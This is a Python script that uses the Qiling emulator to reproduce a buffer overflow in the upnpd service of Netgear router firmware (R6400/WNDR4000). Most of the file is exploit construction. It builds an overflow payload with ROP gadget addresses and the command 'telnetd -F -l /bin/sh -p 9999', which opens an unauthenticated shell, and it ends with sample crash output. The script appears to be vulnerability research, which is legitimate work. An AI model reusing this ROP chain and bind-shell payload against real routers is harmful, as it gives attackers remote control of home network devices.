#!/usr/bin/env python3
#
# Cross Platform and Multi Architecture Advanced Binary Emulation Framework
# Built on top of Unicorn emulator (www.unicorn-engine.org)

import threading, time
from qiling import *
from qiling.os.posix.syscall.unistd import ql_syscall_vfork


class Fake_nvram:
    def __init__(self, init_buf):
        self.buf = init_buf
        self.cur_offset = 0
        self.name = "[nvram]"

    def read(self, size):
        if size == 0x20000:
            return bytes(size)
        key = ql.mem.string(ql.os.function_arg[1])
        # print('reading ...', key, '@', hex(ql.reg.pc))

        if key.encode() in self.buf:
            _key = key.encode()
            ret = list(filter(lambda x: x.startswith(_key), self.buf.split(b"\x00")))[0]
            ret = ret.split(b"=")[1]
            return ret

    def write(self, s):
        self.buf = s
        _diff = len(s) - len(self.buf)
        return _diff

    def fstat(self):
        return -1

    def close(self):
        return 0

    def lseek(self, offset, origin=0, **kwargs):
        if origin == 0:  # seek to beginning of file
            self.cur_offset = offset

        elif origin == 1:  # seek to cur_offset + offset
            self.cur_offset += offset

        elif origin == 2:  # seek to the end of file
            _len = len(self.buf)
            self.cur_offset = 0 if _len == 0 else _len - 1

        return self.cur_offset


fake_nvram = Fake_nvram(b"\x00".join([
    b"upnpd_debug_level=0",
    b"upnp_turn_on=0",
    b"board_id=U12H332T77_NETGEAR",
    b"lan_ipaddr=192.168.0.1",
    b"friendly_name=WNDR4000",
]))

def my_recvfrom(ql, *argu, **kw):
    # if this address readble, RCE; otherwise DOS;
    addr_r7 = b"\xcc\x04\x10\x40"

    addr_rop0 = \
        b"\x24\x91\x01\x00"

    addr_rop1 = \
        b"\xcc\x04\x10\x40" \
        b"\x41\x41\x41\x41\x41\x41\x41\x41" \
        b"\x8f\x9c\x06\x00\x1e\x00\x00\x00" \
        b"\xcc\x04\x10\x40\xcc\x04\x10\x40" \
        b"\xcc\x04\x10\x40\xcc\x04\x10\x40" \
        b"\xcc\x04\x10\x40\xcc\x04\x10\x40" \
        b"\xe4\xce\x00\x00"

    addr_rop2 = \
        b"\x78\x78\x01\x00"

    cmd = \
        b"telnetd -F -l /bin/sh -p 9999;" \
        b"\x00"

    data = b"\x41" * 0x604 + \
           addr_r7 + b"\x41" * 0x28 + addr_rop0 + \
           b"\x61" * 0x258 + addr_rop1 + cmd + \
           b"\x41" * 0x3ed + addr_rop2
    regreturn = len(data)
    ql.os.definesyscall_return(regreturn)


def bug_show(ql, *argu, **kw):
    print('++++ R0 ++++', hex(ql.reg.read("R0")))
    print('+++ [R0] +++', ql.mem.read(ql.reg.read("R0"), 0x100))
    print('\n\n+++Bug Here! R4==' + hex(ql.reg.read("R4")) + '!!!!!!!!!!\n\n')
    # exit(0)


def wr_flag(ql, *argu, **kw):
    ql.reg.write("R0", 0x1)
    print("write success**********")


def mem_watch(ql, *argu, **kw):
    print("R0-mem", ql.mem.read(ql.reg.read("R0"), 0x100))
    print("-------------------------------------")
    print("R1-mem", ql.mem.read(ql.reg.read("R0"), 0x100))
    print("-------------------------------------")
    print("R7-mem", ql.mem.read(ql.reg.read("R7"), 0x100))


def wr_data(ql, *argu, **kw):
    # if this address readble, RCE; otherwise DOS;
    addr_r7 = b"\xcc\x04\x10\x40"

    addr_rop0 = b"\x24\x91\x01\x00"

    addr_rop1 = \
        b"\xcc\x04\x10\x40" \
        b"\x41\x41\x41\x41\x41\x41\x41\x41" \
        b"\x8f\x9c\x06\x00\x1e\x00\x00\x00" \
        b"\xcc\x04\x10\x40\xcc\x04\x10\x40" \
        b"\xcc\x04\x10\x40\xcc\x04\x10\x40" \
        b"\xcc\x04\x10\x40\xcc\x04\x10\x40" \
        b"\xe4\xce\x00\x00"

    addr_rop2 = b"\x78\x78\x01\x00"

    cmd = b"telnetd -F -l /bin/sh -p 9999;\x00"

    # data = b"\x33\x32" \
    #         + b"\x41"*0x602 + \
    #             addr_r7 + b"\x41"*0x28 + addr_rop0 + \
    #             b"\x61"*0x258 + addr_rop1 + cmd + \
    #             b"\x41"*0x3ed + addr_rop2

    data = b"\x41" * (0x604 + len(addr_r7) + 0x28 + len(addr_rop0) +
                      0x258 + len(addr_rop1) + len(cmd) + 0x3ed + len(addr_rop2))

    src_addr = ql.reg.read("R1")
    ql.mem.write(src_addr, data)


def main():
    ql = Qiling(["./rootfs/usr/sbin/upnpd"], "./rootfs",
                output="debug", console=True, profile="r6400.ql")

    ql.add_fs_mapper("/dev/nvram", fake_nvram)
    ql.add_fs_mapper("/dev/urandom", "/dev/urandom")
    ql.set_syscall(0x2, ql_syscall_vfork)
    ql.set_syscall(292, my_recvfrom)
    ql.multithread = False

    ql.hook_address(wr_flag, 0x1a420)
    ql.hook_address(wr_flag, 0x1a45c)

    ql.hook_address(wr_data, 0x222C4)

    ql.hook_address(mem_watch, 0x222CC)
    ql.hook_address(bug_show, 0xb80c)

    # --- Bug trigger at 0xB80C, R0=R4=can not access ---

    ql.run()


class send_pkt(threading.Thread):
    def __init__(self, sleeptime):
        threading.Thread.__init__(self)
        self.sleeptime = sleeptime

    def run(self):
        import socket
        ip = '127.0.0.1'
        port = 1900
        time.sleep(self.sleeptime)

        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.connect((ip, port))
        sock.send(b"\x41")
        print('****Send Success*****')


class overflow_verify(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)

    def run(self):
        main()


if __name__ == "__main__":
    thread_send = send_pkt(5)  # Wait for thread_overflow initialization to complete
    thread_overflow = overflow_verify()
    thread_send.start()
    thread_overflow.start()
    thread_send.join()
    thread_overflow.join()

# usage: ./R6400_upnpd_overflow_verify.py

# ++++ R0 ++++ 0x7ff4ad30
# +++ [R0] +++ bytearray(b'AAAAAAA.......')

# +++Bug Here! R4==0x41414141!!!!!!!!!!

# MOV R0, R4;
# strstr();     strstr() will read R0, but R0=R4 can not access

# [!] Emulation Error

# [-] r0  :        0x41414141
# [-] r1  :        0x7ff4ad34
# [-] r2  :        0x7ff4ad34
# [-] r3  :        0x41414141
# [-] r4  :        0x41
